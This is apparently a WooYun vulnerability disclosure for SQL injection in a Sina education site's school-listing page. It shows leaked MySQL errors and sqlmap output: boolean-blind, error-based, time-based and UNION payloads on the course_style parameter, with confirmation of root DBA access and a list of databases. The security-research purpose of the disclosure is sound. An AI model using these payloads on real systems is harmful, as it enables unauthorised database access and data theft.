wybug_detail:
漏洞详情 披露状态：   									2015-06-05：	细节已通知厂商并且等待厂商处理中									2015-06-05：	厂商已经确认，细节仅向厂商公开									2015-06-15：	细节向核心白帽子及相关领域专家公开									2015-06-25：	细节向普通白帽子公开									2015-07-05：	细节向实习白帽子公开									2015-07-20：	细节向公众公开  简要描述： 233 详细说明：  
http://ischool.edu.sina.com/school/lists.html?country=&course_style=1还有几处报错：http://ischool.edu.sina.com/school/lists.html?keyword=1http://ischool.edu.sina.com/school/lists.html?page=\&school_city=171&school_prov=8Error Number: 1064You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%') ORDER BY `sid` asc LIMIT 10' at line 3SELECT * FROM (`school_info`) WHERE `st_flag` = 0 and (s_name LIKE '%1'"%' or course_style LIKE '%1'"%') ORDER BY `sid` asc LIMIT 10Filename: /alidata/www/phpwind/models/model.php
   漏洞证明：  
---Parameter: course_style (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: country=&course_style=-2215' OR 4155=4155 AND 'JnPW'='JnPW    Type: error-based    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: country=&course_style=1' OR (SELECT 3647 FROM(SELECT COUNT(*),CONCAT(0x7162716271,(SELECT (ELT(3647=3647,1))),0x7171786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'gZxI'='gZxI    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 OR time-based blind    Payload: country=&course_style=1' OR SLEEP(5) AND 'osEJ'='osEJ    Type: UNION query    Title: MySQL UNION query (NULL) - 51 columns    Payload: country=&course_style=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162716271,0x5646487750515944564b,0x7171786271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#---web application technology: Nginx, PHP 5.5.7back-end DBMS: MySQL 5.0current user:    'root@localhost'current user is DBA:    Trueavailable databases [5]:[*] information_schema[*] ischool[*] mysql[*] performance_schema[*] test
   修复方案：  ~~~~~~~   版权声明：转载请注明来源 紫霞仙子@乌云
